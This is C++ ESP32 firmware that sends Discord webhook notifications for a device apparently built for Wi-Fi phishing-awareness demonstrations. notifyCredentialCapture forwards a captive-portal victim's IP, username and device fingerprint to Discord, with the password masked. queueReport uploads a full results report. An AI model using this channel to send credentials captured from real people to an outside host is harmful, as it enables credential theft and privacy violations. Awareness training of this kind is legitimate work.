#include "integrations/DiscordNotifier.h"

#include <esp_http_client.h>
#include <esp_crt_bundle.h>
#include <ctime>
#include <cstdlib>
#include <strings.h>

#include "security/ConfigValidation.h"
#include "web/Json.h"

namespace mak {
namespace {

// Paleta de cores (decimal) por tipo de evento — pensada para projeção.
constexpr uint32_t kColorSystem = 3447003;    // azul
constexpr uint32_t kColorAuth = 9807270;      // cinza
constexpr uint32_t kColorScenario = 5793266;  // blurple
constexpr uint32_t kColorInteraction = 15105570;  // laranja (momento-chave)
constexpr uint32_t kColorReveal = 10181046;   // roxo
constexpr uint32_t kColorStop = 15158332;     // vermelho
constexpr uint32_t kColorWifi = 1752220;      // teal
constexpr uint32_t kColorBle = 3066993;       // verde
constexpr uint32_t kColorCapture = 16711680;  // vermelho forte

void fmtUptime(uint32_t ms, char* out, size_t n) {
  uint32_t s = ms / 1000;
  snprintf(out, n, "%02u:%02u:%02u", (unsigned)(s / 3600),
           (unsigned)((s / 60) % 60), (unsigned)(s % 60));
}

// Escapa aspas/barras para embutir em JSON. Entrada já é controlada/curta.
String jsonEscape(const char* s) {
  String out;
  for (const char* p = s; p && *p; ++p) {
    char c = *p;
    if (c == '"' || c == '\\') {
      out += '\\';
      out += c;
    } else if (c == '\n') {
      out += "\\n";
    } else if ((unsigned char)c >= 0x20) {
      out += c;
    }
  }
  return out;
}

}  // namespace

bool DiscordNotifier::begin() {
  // Nada a inicializar além da checagem de config; o uplink é gerido pelo App.
  return true;
}

bool DiscordNotifier::enabled() const {
  return settings_.discordEnabled() &&
         validation::isValidDiscordWebhook(settings_.discordWebhook().c_str());
}

String DiscordNotifier::buildEmbed(const char* title, const char* description,
                                   uint32_t color, const char* footer) const {
  String p;
  p.reserve(320);
  p += "{\"username\":\"MentosArmyKnife-C3\",\"allowed_mentions\":{\"parse\":[]},\"embeds\":[{";
  p += "\"title\":\"" + jsonEscape(title) + "\",";
  p += "\"description\":\"" + jsonEscape(description) + "\",";
  p += "\"color\":" + String(color);
  if (footer && footer[0]) {
    p += ",\"footer\":{\"text\":\"" + jsonEscape(footer) + "\"}";
  }
  p += "}]}";
  return p;
}

void DiscordNotifier::notifyEvent(const Event& ev) {
  if (!enabled()) return;

  char up[16];
  fmtUptime(ev.uptimeMs, up, sizeof(up));
  char footer[80];
  char safeScenario[cfg::kScenarioIdMaxLen];
  validation::sanitizeLabel(ev.scenarioId, safeScenario, sizeof(safeScenario));
  snprintf(footer, sizeof(footer), "uptime %s%s%s", up,
           safeScenario[0] ? " · cenario: " : "", safeScenario);

  const char* title = "Evento";
  char desc[200] = {0};
  uint32_t color = kColorSystem;

  // Rótulo amigável do cenário (se o scenarioId for allowlisted).
  const ScenarioInfo* sc = validation::findScenario(ev.scenarioId);
  const char* scLabel = sc ? sc->label : "";

  switch (ev.type) {
    case EventType::kSystem:
      title = "🟢 Sistema";
      snprintf(desc, sizeof(desc), "Mudança de estado / status do dispositivo.");
      color = kColorSystem;
      break;
    case EventType::kOperatorAuth:
      title = "🔐 Operador";
      snprintf(desc, sizeof(desc), ev.flag ? "Login do operador." : "Falha de login / logout.");
      color = kColorAuth;
      break;
    case EventType::kScenarioStart:
      title = "▶️ Cenário iniciado";
      snprintf(desc, sizeof(desc), "Em execução: **%s**.",
               scLabel[0] ? scLabel : "cenário de conscientização");
      color = kColorScenario;
      break;
    case EventType::kScenarioStop:
      title = "⏹️ Cenário encerrado";
      snprintf(desc, sizeof(desc), "Cenário parado (STOP ou fim).");
      color = kColorStop;
      break;
    case EventType::kDemoInteraction:
      title = "🟠 Interação de demonstração detectada!";
      snprintf(desc, sizeof(desc),
               "Simulação educativa registrada: %s. Sem credenciais ou dados de conta.",
               strcmp(ev.scenarioId, "simulation_google") == 0 ? "Google (fictício)" :
               strcmp(ev.scenarioId, "simulation_apple") == 0 ? "Apple (fictício)" : "interação");
      color = kColorInteraction;
      break;
    case EventType::kReveal:
      title = "🟣 Revelação ativada";
      snprintf(desc, sizeof(desc), "Momento educativo%s%s: abrir a caixinha e discutir controles.",
               scLabel[0] ? " — " : "", scLabel);
      color = kColorReveal;
      break;
    case EventType::kWifiScan:
      title = "📶 Varredura Wi-Fi (agregado)";
      snprintf(desc, sizeof(desc), "Redes vistas: **%u** (sem BSSID/SSID).", (unsigned)ev.count);
      color = kColorWifi;
      break;
    case EventType::kBleScan:
      title = "🟩 Discovery BLE (agregado)";
      snprintf(desc, sizeof(desc), "Anúncios vistos: **%u** (endereços omitidos).", (unsigned)ev.count);
      color = kColorBle;
      break;
    case EventType::kCredentialCapture:
      title = "🔴 Credenciais capturadas!";
      snprintf(desc, sizeof(desc),
               "O portal recebeu um envio%s%s. Valores no painel e no relatório exportado pelo operador.",
               scLabel[0] ? " — " : "", scLabel);
      color = kColorCapture;
      break;
    default:
      return;
  }
  enqueue(buildEmbed(title, desc, color, footer));
}

void DiscordNotifier::notifyText(const char* title, const char* description,
                                 uint32_t color) {
  if (!enabled()) return;
  enqueue(buildEmbed(title, description, color, nullptr));
}

void DiscordNotifier::notifyCredentialCapture(const char* user, const char* tmpl,
                                              const char* deviceSummary,
                                              const char* ip) {
  if (!enabled()) return;
  char desc[416];
  snprintf(desc, sizeof(desc),
           "O portal recebeu um envio de login.\nIP (no AP): %s\nUsuário: %s\nTemplate: %s\nSenha: %s\nAparelho: %s",
           ip && ip[0] ? ip : "?",
           user && user[0] ? user : "(vazio)",
           tmpl && tmpl[0] ? tmpl : "padrao",
           cfg::kPasswordMask,
           deviceSummary && deviceSummary[0] ? deviceSummary : "(fingerprint não associado)");
  enqueue(buildEmbed("🔴 Credenciais capturadas!", desc, kColorCapture, nullptr));
}

bool DiscordNotifier::enqueue(const String& payload) {
  if (count_ >= kQueueCap) {
    ++dropped_;
    // Fila cheia: descarta o mais antigo (feed ao vivo prioriza o recente).
    head_ = (head_ + 1) % kQueueCap;
    --count_;
  }
  size_t tail = (head_ + count_) % kQueueCap;
  queue_[tail] = payload;
  ++count_;
  return true;
}

void DiscordNotifier::loop() {
  if ((count_ == 0 && !report_.length()) || !enabled() || !ap_.uplinkConnected()) {
    return;
  }
  // Envia no máximo um por ciclo para não bloquear o loop por muito tempo.
  uint32_t now = millis();
  if ((uint32_t)(now - lastFlushMs_) < retryDelayMs_) {
    return;
  }
  lastFlushMs_ = now;

  if (report_.length()) {
    bool sent = postNow(report_, "multipart/form-data; boundary=mentos-report-boundary");
    reportState_ = sent ? "sent" : "retrying";
    if (sent) report_ = String();
    retryDelayMs_ = sent ? 400 : (retryAfterMs_ > 15000 ? retryAfterMs_ : 15000);
    return;
  }

  String& front = queue_[head_];
  if (postNow(front)) {
    front = String();
    head_ = (head_ + 1) % kQueueCap;
    --count_;
    retryDelayMs_ = 400;
  } else {
    retryDelayMs_ = retryAfterMs_ > 15000 ? retryAfterMs_ : 15000;
  }
  // Em falha, mantém na fila para a próxima tentativa.
}

bool DiscordNotifier::postNow(const String& payload, const char* contentType) {
  // Certificate validation needs a synchronized clock. Never fall back to insecure TLS.
  if (std::time(nullptr) < 1704067200) { lastHttpCode_ = -2; return false; }
  esp_http_client_config_t config = {};
  config.url = settings_.discordWebhook().c_str();
  config.method = HTTP_METHOD_POST;
  config.timeout_ms = 5000;
  config.crt_bundle_attach = esp_crt_bundle_attach;
  config.disable_auto_redirect = true;
  retryAfterMs_ = 0;
  config.user_data = &retryAfterMs_;
  config.event_handler = [](esp_http_client_event_t* event) -> esp_err_t {
    if (event->event_id == HTTP_EVENT_ON_HEADER && event->header_key && event->header_value &&
        strcasecmp(event->header_key, "Retry-After") == 0) {
      char* end = nullptr;
      const double seconds = std::strtod(event->header_value, &end);
      if (end && !*end && seconds > 0) {
        *static_cast<uint32_t*>(event->user_data) = seconds >= 2147483 ? 2147483000UL : uint32_t(seconds * 1000 + 1);
      }
    }
    return ESP_OK;
  };
  esp_http_client_handle_t client = esp_http_client_init(&config);
  if (!client) { lastHttpCode_ = -1; return false; }
  esp_http_client_set_header(client, "Content-Type", contentType);
  esp_http_client_set_post_field(client, payload.c_str(), payload.length());
  const esp_err_t result = esp_http_client_perform(client);
  lastHttpCode_ = result == ESP_OK ? esp_http_client_get_status_code(client) : -1;
  esp_http_client_cleanup(client);
  return lastHttpCode_ >= 200 && lastHttpCode_ < 300;
}

bool DiscordNotifier::queueReport(const String& report, const String& summary) {
  if (!enabled() || report_.length() || report.length() > 24576) return false;
  String body;
  if (!body.reserve(report.length() + summary.length() * 2 + 1024)) return false;
  body = "--mentos-report-boundary\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n\r\n";
  body += "{\"username\":\"MentosArmyKnife-C3\",\"allowed_mentions\":{\"parse\":[]},";
  body += "\"content\":\"Relatório de operações. Resultados completos no anexo JSON.\",\"embeds\":[{\"title\":\"MentosArmyKnife — resultados\",\"description\":";
  body += jsonString(summary.c_str());
  body += ",\"color\":1752220}],\"attachments\":[{\"id\":0,\"filename\":\"mentos-report.json\"}]}\r\n";
  body += "--mentos-report-boundary\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"mentos-report.json\"\r\nContent-Type: application/json\r\n\r\n";
  body += report;
  body += "\r\n--mentos-report-boundary--\r\n";
  report_ = std::move(body);
  reportState_ = "queued";
  return true;
}

bool DiscordNotifier::sendTest() {
  if (!enabled()) return false;
  const String payload = buildEmbed("✅ Teste de conexão",
    "MentosArmyKnife-C3 conectado ao feed de demonstração.", kColorBle, "modo treinamento");
  if (ap_.uplinkConnected() && postNow(payload)) return true;
  enqueue(payload);
  return false;
}

void DiscordNotifier::stop() {
  // Limpa a fila (não vaza nada no desligamento).
  for (size_t i = 0; i < kQueueCap; ++i) queue_[i] = String();
  head_ = 0;
  count_ = 0;
  report_ = String();
  reportState_ = "idle";
}

}  // namespace mak
